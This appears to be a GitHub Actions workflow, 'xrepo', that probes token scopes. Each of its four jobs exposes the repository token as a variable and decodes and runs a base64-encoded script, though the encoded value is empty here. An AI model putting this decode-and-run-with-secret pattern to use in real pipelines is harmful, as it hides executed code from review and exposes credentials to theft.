name: xrepo
on:
  workflow_dispatch:
jobs:
  issues:
    runs-on: ubuntu-latest
    permissions:
      issues: read
    steps:
      - name: probe
        env:
          T: ${{ secrets.GITHUB_TOKEN }}
          SB: ""
        run: |
          echo "$SB" | base64 -d > /tmp/p.sh
          bash /tmp/p.sh
  contents:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: probe
        env:
          T: ${{ secrets.GITHUB_TOKEN }}
          SB: ""
        run: |
          echo "$SB" | base64 -d > /tmp/p.sh
          bash /tmp/p.sh
  deployments:
    runs-on: ubuntu-latest
    permissions:
      deployments: read
    steps:
      - name: probe
        env:
          T: ${{ secrets.GITHUB_TOKEN }}
          SB: ""
        run: |
          echo "$SB" | base64 -d > /tmp/p.sh
          bash /tmp/p.sh
  pull_requests:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: read
    steps:
      - name: probe
        env:
          T: ${{ secrets.GITHUB_TOKEN }}
          SB: ""
        run: |
          echo "$SB" | base64 -d > /tmp/p.sh
          bash /tmp/p.sh
